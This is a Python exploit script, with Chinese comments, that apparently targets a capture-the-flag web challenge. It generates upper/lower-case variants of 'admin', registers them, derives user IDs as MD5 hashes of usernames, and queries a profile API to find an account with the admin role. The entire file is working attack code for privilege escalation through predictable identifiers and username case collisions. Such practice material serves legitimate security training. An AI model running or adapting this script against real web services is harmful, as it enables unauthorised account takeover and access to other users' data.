import requests
import re
import hashlib

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 最终尝试")
print(f"[*] Target: {BASE_URL}")
print()

# 最后的尝试：所有 2 个字母的大小写组合
print("[*] 测试：所有 'admin' 的大小写组合")

# 生成所有可能的大小写组合
import itertools

letters = ['a', 'd', 'm', 'i', 'n']
combinations = []

# 生成所有 5 个字母的组合（每个字母可以是大写或小写）
for combination in itertools.product(['lower', 'upper'], repeat=5):
    username = ''
    for i, case in enumerate(combination):
        if case == 'lower':
            username += letters[i].lower()
        else:
            username += letters[i].upper()
    combinations.append(username)

# 移除 "admin" 和 "ADMIN"
combinations = [c for c in combinations if c not in ["admin", "ADMIN"]]

print(f"    [!] 生成了 {len(combinations)} 个组合")

# 测试前 20 个
for username in combinations[:20]:
    print(f"    [-] 测试: {username}")
    
    # 检查是否已经注册
    resp = session.post(f"{BASE_URL}/register", data={"username": username})
    
    if resp.status_code == 200 and "UID" in resp.text:
        print(f"        [+] 已注册!")
        uid_match = re.search(r'[a-f0-9]{32}', resp.text)
        if uid_match:
            uid = uid_match.group()
            print(f"        UID: {uid}")
            
            # 检查角色
            profile_resp = session.post(f"{BASE_URL}/api/profile", 
                json={"uid": uid},
                headers={"Content-Type": "application/json"})
            print(f"        Role: {profile_resp.text}")
            
            if '"role":"admin"' in profile_resp.text:
                print(f"        [!!!] 找到管理员!")
                break
    elif resp.status_code == 400 and "already registered" in resp.text.lower():
        print(f"        [-] 已注册")
        
        # 计算并检查 UID
        uid = hashlib.md5(username.encode()).hexdigest()
        profile_resp = session.post(f"{BASE_URL}/api/profile", 
            json={"uid": uid},
            headers={"Content-Type": "application/json"})
        print(f"        Role: {profile_resp.text}")
        
        if '"role":"admin"' in profile_resp.text:
            print(f"        [!!!] 找到管理员!")
            break

print()

# 测试2: 尝试已有的所有变体
print("[*] 测试2: 检查所有已有的变体")

all_variants = [
    "admiN", "ADMiN", "aDMin", "ADMIn",
    "admIn", "aDMIN", "ADMin", "aDmin",
    "ADMin", "aDmiN", "AdmiN", "aDMINi",
]

for username in all_variants:
    uid = hashlib.md5(username.encode()).hexdigest()
    print(f"    [-] {username}: {uid}")
    
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        {profile_resp.status_code}: {profile_resp.text}")
    
    if '"role":"admin"' in profile_resp.text:
        print(f"        [!!!] 找到管理员!")

print()

print("[*] 测试完成")
